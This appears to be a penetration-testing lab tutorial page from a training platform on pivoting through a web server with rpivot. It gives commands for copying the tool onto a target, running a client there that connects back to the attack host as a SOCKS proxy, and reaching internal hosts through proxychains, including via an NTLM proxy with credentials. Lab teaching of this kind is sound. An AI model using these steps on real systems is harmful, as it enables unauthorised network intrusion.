<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/158/section/1434
// Platform Version: V1
// Module ID: 158
// Module Name: Pivoting, Tunneling, and Port Forwarding
// Module Difficulty: Medium
// Section ID: 1434
// Section Title: Web Server Pivoting with Rpivot
// Page Title: Pivoting, Tunneling, and Port Forwarding
// Page Number: 10
-->

# Web Server Pivoting with Rpivot

**Module Name:** Pivoting, Tunneling, and Port Forwarding **Page Number:** 10

#### PIVOTING, TUNNELING, AND PORT FORWARDING

# Web Server Pivoting with Rpivot

![https://academy.hackthebox.com/storage/modules/158/77.png](https://academy.hackthebox.com/storage/modules/158/77.png)

#### Cloning rpivot

```shell-session
[!bash!]$ sudo git clone https://github.com/klsecservices/rpivot.git
```

#### Installing Python2.7

```shell-session
[!bash!]$ sudo apt-get install python2.7
```

#### Running server.py from the Attack Host

```shell-session
[!bash!]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

#### Transfering rpivot to the Target

```shell-session
[!bash!]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

#### Running client.py from Pivot Target

```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

#### Confirming Connection is Established

```shell-session
New connection from host 10.129.202.64, source port 35226
```

#### Browsing to the Target Webserver using Proxychains

```shell-session
proxychains firefox-esr 172.16.5.135:80
```

![https://academy.hackthebox.com/storage/modules/158/rpivot_proxychain.png](https://academy.hackthebox.com/storage/modules/158/rpivot_proxychain.png)

#### Connecting to a Web Server using HTTP-Proxy & NTLM Auth

```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

# 

# 

#### Questions

####